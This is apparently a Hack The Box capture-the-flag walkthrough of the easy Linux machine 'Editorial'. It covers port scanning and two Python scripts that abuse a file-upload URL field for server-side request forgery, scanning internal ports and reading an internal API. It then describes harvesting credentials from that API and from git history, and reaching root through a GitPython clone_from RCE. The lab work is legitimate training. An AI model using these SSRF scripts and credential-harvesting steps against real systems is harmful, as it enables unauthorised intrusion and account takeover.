---
date: 2024-10-19
categories: [Linux, Easy]
---

![Logo](https://github.com/user-attachments/assets/f0778b7a-f98d-4de2-a60c-d82baf18432a)

---

| **Created by** | **Page**     | **Difficulty** | **OS**  |
|-------------|--------------|----------------|---------|
| [Lanz](https://app.hackthebox.com/users/73707)         | [Hack The Box](https://www.hackthebox.com/)     | Easy           | Linux   |

---









- I start with a scan of the open ports,
    
    ```bash
    nmap -p- -vvv -sS --min-rate 2000 -Pn 10.10.11.20 -oG scan
    ```
    
    ![image](https://github.com/user-attachments/assets/0530e77d-29dc-41d4-87a3-feea64bb1e37)

    
- I continue with a scan of the versions and technologies that are running on the open ports that we have found
    
    ```bash
    nmap -p22,80 -sCV 10.10.11.20 -oN ports
    ```
    
    ![image 1](https://github.com/user-attachments/assets/1d1e8a64-f418-4b6d-9027-69f585b678bb)

    
- I found the domain `editorial.htb` and add it to the file in the `/etc/hosts` file
- I look at what technologies they are using on the website.
    
    ```bash
    whatweb 10.10.11.20 
    whatweb editorial.htb
    ```
    
    ![image 2](https://github.com/user-attachments/assets/52f40437-6109-4b82-afe6-aecfee5e6e3d)

    
    ![image 3](https://github.com/user-attachments/assets/dc563456-6284-407d-8252-0e996f45c85e)

    
- Browsing the web I find a page that allows us to upload a file. I can upload files but they are not interpreted.
    
    ![image 4](https://github.com/user-attachments/assets/83588bc1-0929-4f7f-815a-c9f983b3afdd)

    
    ![image 5](https://github.com/user-attachments/assets/1cd5b645-0cae-45b8-8033-148df6c85d4c)

    
- As I see that the url returned changes depending on whether the file has been uploaded or not, I decide to perform a scan in case it has open ports that are not accessible from the outside.
    
    ![image 6](https://github.com/user-attachments/assets/453b8506-cddc-4040-839f-632695a3d1f3)

    
    ![image 7](https://github.com/user-attachments/assets/3560b871-99e0-40d6-a8b9-ffa6c5ac0d1c)

    
- I create a script to automate the recognition and to show me the open ports according to the length of the response.
    
    ```bash
    #!/usr/bin/python3
    import requests
    import os
    import signal
    import time
    from pwn import *
    
    def def_handler(sig, frame):
    	print("\n\n[!]Saliendo....\n")
    	sys.exit(1)
    
    signal.signal(signal.SIGINT, def_handler)
    
    def scanPorts():
    	burp0_url = "http://editorial.htb:80/upload-cover"
    	burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0", "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Content-Disposition": "inline", "Accept-Encoding": "gzip, deflate, br", "Content-Type": "multipart/form-data; boundary=---------------------------134859763814168705221183954404", "Origin": "http://editorial.htb", "Connection": "keep-alive", "Referer": "http://editorial.htb/upload"}
    	openPorts = ""
    	p2 = log.progress("Ports open")
    	p1 = log.progress("Scanning port")
    	for port in range(1, 65535):
    		burp0_data = f"-----------------------------134859763814168705221183954404\r\nContent-Disposition: form-data; name=\"bookurl\"\r\n\r\nhttp://127.0.0.1:{port}\r\n-----------------------------134859763814168705221183954404\r\nContent-Disposition: form-data; name=\"bookfile\"; filename=\"\"\r\nContent-Type: application/octet-stream\r\n\r\n\r\n-----------------------------134859763814168705221183954404--\r\n"
    		response = requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
    		lon = len(response.text)
    		p1.status(port)
    		if (lon != 61):
    			if (openPorts == ""):
    				openPorts = port
    			else:
    				openPorts += f",{port}"
    			p2.status(openPorts)
    
    if __name__ == '__main__':
    	scanPorts()
    
    ```
    
- I find that port 5000 is open internally
    
    ![image 8](https://github.com/user-attachments/assets/0eac3f3d-a355-4165-9eed-3fbe0e459279)

    
- I look at the response it gives me when attacking against that port
    
    ![image 9](https://github.com/user-attachments/assets/6ecd93b7-0ff8-4b76-a81f-9729c9f714dd)

    
- When displaying the content of the response we see that we are dealing with an API. I modify the script so that it shows us the content of the queries directly and I begin to investigate the answers of the different endpoints.
    
    ```bash
    #!/usr/bin/python3
    import requests
    import os
    import signal
    import time
    import json
    from pwn import *
    
    def def_handler(sig, frame):
    	print("\n\n[!]Saliendo....\n")
    	sys.exit(1)
    
    signal.signal(signal.SIGINT, def_handler)
    
    url = "http://127.0.0.1:5000/api/latest/metadata/messages/authors"
    
    def scanPorts():
    	burp0_url = "http://editorial.htb:80/upload-cover"
    	burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0", "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Content-Disposition": "inline", "Accept-Encoding": "gzip, deflate, br", "Content-Type": "multipart/form-data; boundary=---------------------------134859763814168705221183954404", "Origin": "http://editorial.htb", "Connection": "keep-alive", "Referer": "http://editorial.htb/upload"}
    	p1 = log.progress("URL")
    	p1.status(url)
    	burp0_data = f"-----------------------------134859763814168705221183954404\r\nContent-Disposition: form-data; name=\"bookurl\"\r\n\r\n{url}\r\n-----------------------------134859763814168705221183954404\r\nContent-Disposition: form-data; name=\"bookfile\"; filename=\"\"\r\nContent-Type: application/octet-stream\r\n\r\n\r\n-----------------------------134859763814168705221183954404--\r\n"
    	response = requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
    	urlRequest = "http://editorial.htb/"+response.text
    
    	response2 = requests.get(urlRequest)
    	print(response2.text)
    
    if __name__ == '__main__':
    	scanPorts()
    
    ```
    
- When testing the endpoint authors encountered some potential credentials. I try to connect by ssh with those credentials and I get access and read the first flag
    
    ![image 10](https://github.com/user-attachments/assets/8a49c0a0-ec8f-4fca-a81e-96fd0fbdd5da)

    
    ![image 11](https://github.com/user-attachments/assets/500a15b3-c714-422e-8a88-1f7b46dc8378)

    
- I find that the user `prod`
    
    ![image 12](https://github.com/user-attachments/assets/aaf5761c-2a7e-40c6-a6f3-94e7fc280af4)

    
- When searching for files in the system I find a git repository in /opt/apps
    
    ![image 13](https://github.com/user-attachments/assets/82cffe08-1edc-449d-b66c-de6120d11801)

    
- I mount a web server on port `8000` with `python3 -m http.server` to download to my machine this repository with `git-dumper` and then with `extractor` retrieve the contents of the files in each commit.
    
    [git-dumper](https://github.com/arthaud/git-dumper)
    
    [extractor.sh](https://github.com/internetwache/GitTools/blob/master/Extractor/extractor.sh)
    
    ![image 14](https://github.com/user-attachments/assets/a9af2059-4d86-40cb-a34c-ce80058c1beb)

    
    ![image 15](https://github.com/user-attachments/assets/dd120772-498e-4306-b35a-b8113ca93dda)

    
- When I check the messages of each commit, I see `app_api/app.py` in the file I had and I find another credential with which I can switch user
    
    ![image 16](https://github.com/user-attachments/assets/11baf754-09b1-4986-81b7-8b536159729d)

    
    ![image 17](https://github.com/user-attachments/assets/95bba6b6-f125-4bf9-a0ff-f79141540b96)

    
- Looking at the commands that I can run as another user without providing a password I find that I can run as root a file
    
    ![image 18](https://github.com/user-attachments/assets/4a792ef0-2fe7-479d-9dae-2782420edc22)

    
    ![image 19](https://github.com/user-attachments/assets/11b93363-3655-454b-b40f-094d6d2ea5dd)

    
- After trying to do `python Library Hijacking` and getting nothing, I search for vulnerabilities in the clone_from function and find a `CVE` that allows `Remote Code Execution (RCE)`. Thanks to this I manage to execute a command as root, I become this user and I manage to read the second flag.
    
    https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858
    
    ![image 20](https://github.com/user-attachments/assets/011c8057-b3f0-4f02-a591-3dc5cef2cf70)
